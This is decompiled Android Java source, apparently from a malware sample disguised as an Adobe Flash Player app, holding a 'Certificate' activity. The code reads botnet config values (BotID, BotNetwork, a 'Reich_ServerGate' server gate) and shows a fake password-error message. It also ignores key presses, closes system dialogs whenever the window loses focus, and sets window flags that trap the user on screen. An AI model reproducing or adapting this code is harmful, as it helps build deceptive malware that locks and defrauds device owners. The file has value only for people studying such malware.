package com.adobe.flashplayer;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;
import com.adobe.flash.R;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class Certificate extends Activity {
    boolean activitySwitchFlag = false;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        setContentView(R.layout.activity_certificate);
        Button OK = (Button) findViewById(R.id.button1);
        ((Button) findViewById(R.id.button2)).setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                Intent intent = new Intent("android.settings.SETTINGS");
                intent.setFlags(AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                intent.setFlags(1073741824);
                intent.setFlags(268435456);
                intent.addFlags(67108864);
                Certificate.this.startActivity(intent);
                System.exit(0);
            }
        });
        OK.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                Toast.makeText(Certificate.this.getApplicationContext(), "Deleting error.\n\nWrong password of local storage. Please, try again.", 1).show();
                String BotID = Certificate.this.readConfig("BotID", Certificate.this.getApplicationContext());
                String BotNetwork = Certificate.this.readConfig("BotNetwork", Certificate.this.getApplicationContext());
                String BotLocation = Certificate.this.readConfig("BotLocation", Certificate.this.getApplicationContext());
                String Reich_ServerGate = Certificate.this.readConfig("Reich_ServerGate", Certificate.this.getApplicationContext());
                String BotVer = Certificate.this.readConfig("BotVer", Certificate.this.getApplicationContext());
                String SDK = VERSION.RELEASE;
            }
        });
    }

    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (!hasFocus) {
            sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
        }
    }

    public void onAttachedToWindow() {
        getWindow().addFlags(AccessibilityEventCompat.TYPE_GESTURE_DETECTION_END);
        getWindow().addFlags(32768);
        getWindow().addFlags(8192);
        getWindow().addFlags(4194304);
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        return false;
    }

    private void saveData(String data, String f, Context context) {
        try {
            OutputStreamWriter osw = new OutputStreamWriter(context.openFileOutput(f, 0));
            osw.write(data);
            osw.close();
        } catch (IOException e) {
        }
    }

    /* access modifiers changed from: private */
    public String readConfig(String config, Context context) {
        String ret = "";
        try {
            InputStream inputStream = context.openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }
}
